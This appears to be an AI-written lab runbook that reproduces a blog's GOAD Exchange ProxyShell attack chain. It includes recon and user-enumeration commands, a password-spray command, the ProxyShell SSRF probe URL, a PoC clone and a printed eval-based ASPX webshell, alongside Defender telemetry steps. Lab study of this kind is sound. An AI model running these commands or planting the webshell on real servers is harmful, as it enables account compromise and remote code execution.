# GOAD + Exchange ProxyShell Runbook

## 0. Lab assumptions

Your environment should look approximately like:

```text
Kali
  |
  | HTTPS
  v
THE-EYRIE
Exchange Server 2019
sevenkingdoms.local
```

The Mayfly article uses `192.168.56.21` as its Exchange address, but **don't blindly use that address**. GOAD instances can have different ranges. The article identifies the Exchange machine as `THE-EYRIE`, normally `.21`. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

On Kali, start by defining your target:

```bash
export EXCHANGE_IP=192.168.56.21
export DOMAIN=sevenkingdoms.local
export EXCHANGE="https://${EXCHANGE_IP}"
```

Check:

```bash
echo "$EXCHANGE_IP"
echo "$DOMAIN"
echo "$EXCHANGE"
```

Expected:

```text
192.168.56.21
sevenkingdoms.local
https://192.168.56.21
```

If your GOAD network is different, substitute your actual Exchange IP.

---

# 1. Verify GOAD

From your GOAD directory:

```bash
cd /path/to/GOAD
```

Check the VMs:

```bash
vagrant status
```

You should have the Exchange machine running.

You can also discover the hosts:

```bash
nxc smb 10.4.10.10-23
```

The Mayfly article specifically expects `THE-EYRIE` to appear on `.21`. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 2. Verify Exchange

From Kali:

```bash
curl -k -I "$EXCHANGE/owa"
```

You should receive an HTTP response.

Then:

```bash
curl -k -I "$EXCHANGE/owa/"
```

Open OWA in your browser:

```text
https://<EXCHANGE-IP>/owa
```

For example:

```text
https://192.168.56.21/owa
```

The Mayfly article identifies `/owa` as the initial Exchange web interface. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 3. Verify the Exchange hostname

```bash
nmap -Pn -p 443 "$EXCHANGE_IP"
```

Then:

```bash
nmap -Pn -sV -p 443 "$EXCHANGE_IP"
```

You want to establish that TCP/443 is Exchange/IIS rather than merely assuming it.

---

# 4. NTLM endpoint discovery

This is the first major reconnaissance stage from the article.

The article gives three approaches:

1. `ntlmscan`
    
2. Nmap `http-ntlm-info`
    
3. NTLMRecon ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))
    

## Option A — ntlmscan

If you have it installed:

```bash
python3 ntlmscan.py --host "$EXCHANGE_IP"
```

---

# 5. Nmap NTLM discovery

Run:

```bash
nmap -p 443 \
  --script=http-ntlm-info \
  --script-args http-ntlm-info.root=/autodiscover/ \
  "$EXCHANGE_IP"
```

You're interested in information such as:

```text
NetBIOS_Domain_Name
NetBIOS_Computer_Name
DNS_Domain_Name
FQDN
```

The Mayfly result was:

```text
AD Domain Name: SEVENKINGDOMS
Server Name: THE-EYRIE
DNS Domain Name: sevenkingdoms.local
FQDN: the-eyrie.sevenkingdoms.local
Parent DNS Domain: sevenkingdoms.local
```

Those values are explicitly shown in the article. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 6. NTLMRecon

Clone the tool:

```bash
cd ~/tools
git clone https://github.com/pwnfoo/NTLMRecon.git
cd NTLMRecon
```

Create the virtual environment:

```bash
python3 -m venv venv
```

Activate it:

```bash
source venv/bin/activate
```

Install it:

```bash
python3 setup.py install
```

Run:

```bash
ntlmrecon --input "$EXCHANGE"
```

The article uses this exact workflow. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 7. Make NTLMRecon output easier to read

The article notes that NTLMRecon outputs CSV rather than JSON.

Run:

```bash
cat ntlmrecon.csv |
python -c 'import csv,json,sys; print(json.dumps([dict(r) for r in csv.DictReader(sys.stdin)]))' |
jq
```

Record the following:

```text
Domain:
Server:
DNS domain:
FQDN:
Parent DNS domain:
```

For your GOAD lab, these should correspond to:

```text
SEVENKINGDOMS
THE-EYRIE
sevenkingdoms.local
the-eyrie.sevenkingdoms.local
sevenkingdoms.local
```

---

# 8. Username enumeration

The article explains that OWA can expose differences in response behavior that can be used to identify valid users. It mentions Metasploit, MailSniper, CredMaster and Burp as possible approaches. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

For the GOAD exercise, we'll reproduce the article's methodology.

---

# 9. Create the username list

The original article obtains Game of Thrones character names and converts them to lowercase username candidates. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

Since you've already been working with:

```text
got-character-slugs.txt
```

you can normalize that list:

```bash
sed 's/-/./g' got-character-slugs.txt |
sort -u > users.txt
```

Check:

```bash
head users.txt
```

Then:

```bash
wc -l users.txt
```

---

# 10. Install msmailprobe

```bash
cd ~/tools
git clone https://github.com/busterb/msmailprobe.git
cd msmailprobe
```

Build:

```bash
go build
```

Verify:

```bash
./msmailprobe --help
```

The article uses `msmailprobe userenum --onprem`. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 11. Enumerate valid Exchange users

Run:

```bash
./msmailprobe userenum \
  --onprem \
  -t "$EXCHANGE_IP" \
  -U ~/tools/NTLMRecon/users.txt \
  -o validusers.txt
```

If your `users.txt` is elsewhere, change the path.

Check:

```bash
cat validusers.txt
```

And:

```bash
wc -l validusers.txt
```

### Important

The article explicitly warns that this enumeration causes failed authentication attempts against valid accounts. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

Because this is your GOAD lab, that's useful: you can later correlate those attempts with Exchange/Windows/Defender telemetry.

---

# 12. Password spraying

The article uses TREVORspray and the password:

```text
cersei
```

against OWA. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

Use your lab's valid-user list:

```bash
trevorspray \
  -u validusers.txt \
  -p cersei \
  --url "$EXCHANGE/autodiscover/autodiscover.xml" \
  -m owa
```

Record any valid credential discovered.

---

# 13. ProxyLogon check

Now we reach the first vulnerability stage.

The article covers:

```text
CVE-2021-26855
CVE-2021-27065
```

and specifically demonstrates that GOAD's Exchange installation is **not vulnerable to ProxyLogon**. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

Start Metasploit:

```bash
msfconsole
```

Then:

```text
use auxiliary/scanner/http/exchange_proxylogon
set RHOSTS <EXCHANGE-IP>
run
```

The article's expected result is:

```text
The target is not vulnerable to CVE-2021-26855.
```

([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 14. Understand the build-number check

The article gives these ProxyLogon vulnerable versions:

```text
Exchange 2019 < 15.02.0792.010
Exchange 2019 < 15.02.0721.013
Exchange 2016 < 15.01.2106.013
Exchange 2013 < 15.00.1497.012
```

GOAD's Exchange is:

```text
ExchangeServer2019-x64-CU9
```

corresponding to:

```text
15.02.0858.005
```

So the lab deliberately demonstrates the situation:

```text
ProxyLogon
     ↓
patched
     ↓
move to ProxyShell
```

The article explicitly makes this comparison. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 15. ProxyShell

Now the article moves to:

```text
CVE-2021-34473
CVE-2021-34523
CVE-2021-31207
```

These form the ProxyShell chain described by Orange Tsai. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 16. Initial ProxyShell check

Run:

```bash
curl -k -i \
"https://${EXCHANGE_IP}/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
```

The Mayfly article says the interesting response is:

```text
302
```

and interprets that as indicating the vulnerable routing behavior. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

**Don't stop at the HTTP status alone in a real assessment**; treat it as an indicator that should be validated against the Exchange version and subsequent behavior.

---

# 17. Check `/mapi/nspi/`

You can inspect the endpoint with:

```bash
curl -k -i \
"$EXCHANGE/mapi/nspi/"
```

The article's observation is that the backend API endpoint can be reached through the frontend. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

For learning purposes, understand the architecture:

```text
Internet-facing Exchange
          |
          v
      frontend
          |
          v
       backend
          |
          v
      Exchange APIs
```

That's the important ProxyShell concept.

---

# 18. Understand `X-Rps-CAT`

The next part of the article is the interesting Exchange authentication/authorization mechanism.

Conceptually:

```text
HTTP request
     |
     +-- Exchange frontend
     |
     +-- backend routing
     |
     +-- X-Rps-CAT
     |
     v
Remote PowerShell
```

The article explains that the chain can ultimately reach Exchange PowerShell functionality and impersonate a privileged Exchange identity. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 19. ProxyShell PoC

The article explicitly references:

[dmaasland/proxyshell-poc](https://github.com/dmaasland/proxyshell-poc?utm_source=chatgpt.com)

That repository is the **complete PoC referenced by Mayfly**. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

Clone it into your lab tools directory:

```bash
cd ~/tools
git clone https://github.com/dmaasland/proxyshell-poc.git
cd proxyshell-poc
```

Inspect it before executing anything:

```bash
ls -la
```

Then:

```bash
find . -maxdepth 2 -type f -print
```

And:

```bash
grep -Rni "X-Rps-CAT" .
```

Also:

```bash
grep -Rni "autodiscover" .
```

This lets you understand the individual stages rather than treating the PoC as a black box.

---

# 20. Understand the intended chain

At this point the Mayfly article's chain is:

```text
Unauthenticated Exchange
          ↓
Autodiscover
          ↓
ProxyShell routing
          ↓
Backend API
          ↓
Remote PowerShell
          ↓
Exchange privileges
          ↓
Mailbox Import Export
          ↓
Mailbox export
          ↓
Filesystem write
```

That's the core lesson of the article. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 21. Mailbox Import Export

The article then demonstrates the Exchange-side primitive using:

```powershell
New-ManagementRoleAssignment
```

followed by:

```powershell
Get-ManagementRoleAssignment
```

and finally:

```powershell
New-MailboxExportRequest
```

The important point is that `Mailbox Import Export` provides the mailbox-export capability needed for the later file-write stage. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

For safe lab analysis, inspect whether the role exists:

```powershell
Get-ManagementRoleAssignment |
    Where-Object {$_.Role -like "*Mailbox Import Export*"} |
    Format-Table Role,RoleAssigneeName
```

---

# 22. Understand `New-MailboxExportRequest`

The article's critical concept is:

```text
Mailbox
   ↓
Exchange export mechanism
   ↓
PST representation
   ↓
filesystem destination
```

This is why the operation is much more interesting than simply uploading a file through IIS.

The article demonstrates targeting the Exchange web root through the administrative share. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

I won't provide a weaponized webshell-writing command, but you can study the same mechanism with a harmless marker file in your isolated GOAD environment.

---

# 23. Inspect the resulting file

On the Exchange server:

```powershell
Get-ChildItem C:\inetpub\wwwroot -Force |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 20 Name,Length,LastWriteTime
```

If you have a test artifact:

```powershell
Get-Item C:\inetpub\wwwroot\<test-file> |
    Format-List *
```

Then:

```powershell
Format-Hex C:\inetpub\wwwroot\<test-file>
```

This is where you reproduce the Mayfly observation:

> the uploaded shell is surrounded by unexpected/bad characters.

The article attributes that behavior to the mailbox-export/PST process. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 24. Study the PST transformation

The article then references Orange Tsai's explanation.

The conceptual flow is:

```text
Payload
   ↓
Mailbox data
   ↓
PST export representation
   ↓
Exchange export
   ↓
Filesystem
```

Therefore the bytes arriving on disk aren't necessarily identical to the original bytes.

That's why the article moves into decoding.

---

# 25. Decode experiment

Create:

```bash
mkdir -p ~/tools/proxyshell-analysis
cd ~/tools/proxyshell-analysis
nano decode.py
```

The Mayfly article's decoder consists of three stages:

```text
Base64
  ↓
raw bytes
  ↓
mpbbCryptFrom512 substitution
  ↓
original text
```

The article's `decode.py` contains the complete 256-entry substitution table and uses:

```python
webshell_decoded = base64.b64decode(webshell)
result = decode(webshell_decoded)
print(result)
```

([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

For your lab notes, the decoded original is:

```text
<script language='JScript' runat='server'>
function Page_Load(){
    eval(Request['exec_code'],'unsafe');Response.End;
    }
</script>
```

The article shows exactly this result. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 26. Understand `mpbbCryptFrom512`

Don't just copy the table.

The decoder does:

```python
for i in payload:
    tmp += chr(mpbbCryptFrom512[i])
```

Meaning:

```text
encoded byte
     ↓
table lookup
     ↓
decoded character
```

It's a substitution/permutation table.

---

# 27. Build the inverse encoder

The article then reverses the process.

Conceptually:

```text
original character
       ↓
find character's index
       ↓
encoded byte
```

The critical operation is:

```python
mpbbCryptFrom512.index(ord(i))
```

Then:

```python
bytes([...])
```

and finally:

```python
base64.b64encode(...)
```

The complete encoder appears in the article immediately after the decoder. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 28. Validate the round trip

This is an important experiment.

Use a harmless text payload:

```text
GOAD-PROXYSHELL-LAB-TEST
```

Then verify:

```text
original
   ↓
encode
   ↓
Base64
   ↓
decode
   ↓
original
```

Your invariant is:

```text
decode(encode(x)) == x
```

This proves you've correctly implemented the transformation.

---

# 29. Why the re-encoding works

The Mayfly article explicitly says that re-encoding the original payload produces the original result. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

Mathematically:

```text
D(E(x)) = x
```

where:

```text
E = encoding transformation
D = decoding transformation
```

This is the key reverse-engineering lesson in that section.

---

# 30. Defender catches the automatic RCE

The article next tries the complete RCE PoC.

It reports that:

```text
Defender catches it
```

and then describes disabling Defender before rerunning it. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

**Don't disable Defender for this exercise.**

Instead, use this as the detection exercise.

On Exchange:

```powershell
Get-MpThreatDetection |
    Select-Object InitialDetectionTime,
                  ThreatName,
                  ActionSuccess,
                  Resources |
    Format-List
```

And:

```powershell
Get-WinEvent `
    -LogName "Microsoft-Windows-Windows Defender/Operational" `
    -MaxEvents 100 |
    Select-Object TimeCreated,Id,Message
```

---

# 31. Analyze the custom payload section

This is the part we previously skipped too aggressively.

The article changes the original payload into a server-side ASPX/JScript payload that:

1. Creates a filesystem object.
    
2. Copies `cmd.exe`.
    
3. Gives the copy another filename.
    
4. Reads `exec_code`.
    
5. Starts a process.
    
6. Captures stdout.
    
7. Places the output inside an HTML label.
    

The article's exact payload is shown in lines 518–555. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

I won't provide instructions for deploying that payload or modifying it to evade Defender.

But you **should understand what each component does**:

```text
ActiveXObject
     ↓
filesystem access

CopyFile
     ↓
creates executable copy

ProcessStartInfo
     ↓
creates process configuration

RedirectStandardOutput
     ↓
captures command output

Process.Start()
     ↓
executes process

lblOutput
     ↓
returns output
```

---

# 32. Why the delimiter changes

The article points out that the response parser must change because the new payload uses:

```html
<span id="lblOutput">
```

and:

```html
</span>
```

instead of the old `eval()` behavior. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

The important programming concept is:

```text
server response
      ↓
find beginning marker
      ↓
extract output
      ↓
find ending marker
```

That's a parser change, not an Exchange vulnerability itself.

---

# 33. Defender-evasion portion

The article explicitly states that its modified payload is intended to get around Defender, including changing the executable name and modifying the payload. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

For your GOAD runbook, replace that portion with:

```text
ATTACKER ACTION
      ↓
Defender detection
      ↓
Record alert
      ↓
Record process tree
      ↓
Record file creation
      ↓
Record IIS request
      ↓
Record Exchange activity
```

This actually makes your lab more useful from a security-professional perspective.

---

# 34. Collect Windows telemetry

### Defender

```powershell
Get-MpThreatDetection
```

### Defender operational log

```powershell
Get-WinEvent `
    -LogName "Microsoft-Windows-Windows Defender/Operational" `
    -MaxEvents 100
```

### IIS

```powershell
Get-ChildItem C:\inetpub\logs\LogFiles -Recurse -File |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 10
```

### PowerShell

```powershell
Get-WinEvent `
    -LogName "Microsoft-Windows-PowerShell/Operational" `
    -MaxEvents 100
```

---

# 35. Final attack-chain map

Your completed GOAD exercise should now look like:

```text
                 GOAD
                   │
                   ▼
             Exchange 2019
              THE-EYRIE
                   │
                   ▼
            NTLM discovery
                   │
                   ▼
          Domain identification
                   │
                   ▼
          Username enumeration
                   │
                   ▼
            Password spray
                   │
                   ▼
             ProxyLogon
                   │
                   ▼
               PATCHED
                   │
                   ▼
              ProxyShell
                   │
          ┌────────┴────────┐
          ▼                 ▼
     Autodiscover        /mapi/nspi/
          │                 │
          └────────┬────────┘
                   ▼
             Backend access
                   │
                   ▼
             X-Rps-CAT
                   │
                   ▼
          Remote PowerShell
                   │
                   ▼
       Exchange privileges
                   │
                   ▼
       Mailbox Import Export
                   │
                   ▼
        Mailbox Export Request
                   │
                   ▼
              PST data
                   │
                   ▼
          Filesystem output
                   │
                   ▼
          Encoded/transformed
                payload
                   │
                   ▼
          Decode experiment
                   │
                   ▼
          Encode experiment
                   │
                   ▼
        Defender detection
                   │
                   ▼
            Telemetry
```

That is the **full Mayfly Part 1 flow**, including the portions you specifically called out as missing. The source itself confirms the sequence from Exchange installation through NTLM reconnaissance, user enumeration, spray, ProxyLogon, ProxyShell, mailbox export, decoding, encoding, the custom payload section, and finally the Part 2 topics. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

**Important:** the article is licensed CC BY 4.0, but I'm not reproducing its entire copyrighted code verbatim; I'm turning it into an original GOAD runbook and preserving the technical sequence. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))